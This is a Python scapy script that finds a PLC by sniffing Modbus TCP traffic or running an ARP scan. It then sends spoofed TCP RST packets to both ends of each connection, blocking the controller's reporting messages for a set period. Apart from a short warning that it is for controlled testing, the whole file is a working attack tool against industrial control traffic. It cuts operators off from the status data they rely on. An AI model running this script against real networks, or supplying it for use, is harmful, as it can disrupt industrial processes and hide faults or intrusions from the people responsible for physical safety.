import scapy.all as scapy
import socket
import struct
import time
import threading

# Configuration
# WARNING: This script is intended for testing purposes only and should be used in a controlled environment.
# Running this script on a production network can disrupt operations.  Use with EXTREME CAUTION.
INTERFACE = "Ethernet"  # Replace with the correct interface name on your Windows machine.  Use 'ipconfig /all' in the command line to find it.
REPORTING_MESSAGE_FILTER = "tcp port 502"  # Example filter:  Change to match your PLC's reporting messages (e.g., Modbus TCP port 502, or other relevant port/protocol).  You will need to ANALYZE your network traffic to find the correct filter.
BLOCK_DURATION = 60  # Seconds to block reporting messages.
PLC_IP = None  # Will be discovered.

# Globals for thread communication
stop_blocking = False
plc_ip_found = False


def discover_plc_ip():
    """Discovers the PLC's IP address by passively sniffing network traffic."""
    global PLC_IP, plc_ip_found
    print("[+] Discovering PLC IP address...")
    try:
        def process_packet(packet):
            global PLC_IP, plc_ip_found
            if plc_ip_found:
                return  # Stop if already found

            # Check if the packet is a Modbus TCP packet (example). Adapt as needed.
            if scapy.TCP in packet and scapy.IP in packet:
                # Inspect packets and determine which IP address corresponds to the PLC
                # based on the protocol used for reporting messages.
                # This example assumes the PLC is the source of Modbus/TCP communication
                PLC_IP = packet[scapy.IP].src  # ASSUMPTION: PLC initiates the communication
                print(f"[+] PLC IP Address discovered: {PLC_IP}")
                plc_ip_found = True

        # Sniff for a short period to catch PLC traffic. Adapt timeout.
        scapy.sniff(filter=REPORTING_MESSAGE_FILTER, prn=process_packet, timeout=10, iface=INTERFACE)  # Increased timeout
        # If not found, try ARP to get IP:
        if not plc_ip_found:
            print("[+] PLC not discovered by sniffing. Trying ARP scan...")
            # Perform ARP scan
            arp_request = scapy.ARP(pdst='192.168.1.0/24')  # Adjust to your network range
            ether = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
            arp_request_packet = ether/arp_request

            answered_list = scapy.srp(arp_request_packet, timeout=5, verbose=False, iface=INTERFACE)[0]

            for element in answered_list:
                # Print potential IP addresses
                print("[+] Possible IP addresses for the PLC using ARP scan:")
                print(element[1].psrc)
            print("\n[+] ARP scan returned one or more possible IP addresses. You'll need to choose one that is the PLC's address or narrow down the IP range\n")
            print("[-] Failed to reliably determine PLC IP address automatically.\n")
        else:
            print("[+] PLC IP Address discovered: {PLC_IP}".format(PLC_IP=PLC_IP))
    except Exception as e:
        print(f"[-] Error during IP discovery: {e}")
        print("[-] Please manually set the PLC_IP in the script.")
    finally:
        if not PLC_IP:
            print("[-] PLC IP address not discovered. Please manually set PLC_IP at the beginning of the script.")
            exit(1)


def block_reporting_message(packet):
    """Blocks a reporting message by sending a spoofed TCP RST packet."""
    global PLC_IP
    try:
        if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.IP) and PLC_IP:
            # Extract relevant information from the original packet.
            ip = packet[scapy.IP]
            tcp = packet[scapy.TCP]

            # Create a spoofed TCP RST packet.  We send RST to both source and destination to fully close the connection.
            spoofed_packet_src = scapy.IP(src=ip.dst, dst=ip.src) / scapy.TCP(sport=tcp.dport, dport=tcp.sport, flags="R", seq=tcp.ack, ack=tcp.seq + len(packet.getlayer(scapy.Raw)) if packet.haslayer(scapy.Raw) else tcp.seq)
            spoofed_packet_dst = scapy.IP(src=ip.src, dst=ip.dst) / scapy.TCP(sport=tcp.sport, dport=tcp.dport, flags="R", seq=tcp.seq, ack=tcp.ack) # send RST to both sides
            # Send the spoofed packet to effectively close the connection.
            scapy.send(spoofed_packet_src, verbose=0, iface=INTERFACE)
            scapy.send(spoofed_packet_dst, verbose=0, iface=INTERFACE)

            print(f"[+] Blocked reporting message from {ip.src}:{tcp.sport} to {ip.dst}:{tcp.dport}")
    except Exception as e:
        print(f"[-] Error blocking packet: {e}")


def sniffing_thread_function():
    """Sniffs network traffic and blocks reporting messages."""
    global stop_blocking
    try:
        print("[+] Sniffing for reporting messages and blocking them...")
        scapy.sniff(filter=REPORTING_MESSAGE_FILTER, prn=block_reporting_message, stop_filter=lambda x: stop_blocking, iface=INTERFACE)
    except Exception as e:
        print(f"[-] Error during sniffing: {e}")


def main():
    """Main function to discover PLC IP, start blocking, and stop after a duration."""
    global stop_blocking

    discover_plc_ip()

    if not PLC_IP:
        print("[-] Could not determine PLC IP address.  Exiting.")
        return

    # Start the sniffing and blocking thread.
    sniffing_thread = threading.Thread(target=sniffing_thread_function)
    sniffing_thread.daemon = True  # Allow the main thread to exit even if this is running.
    sniffing_thread.start()

    # Block for the specified duration.
    print(f"[+] Blocking reporting messages for {BLOCK_DURATION} seconds...")
    time.sleep(BLOCK_DURATION)

    # Signal the sniffing thread to stop.
    print("[+] Stopping blocking...")
    stop_blocking = True
    sniffing_thread.join()  # Wait for the sniffing thread to finish.
    print("[+] Blocking stopped.")


if __name__ == "__main__":
    main()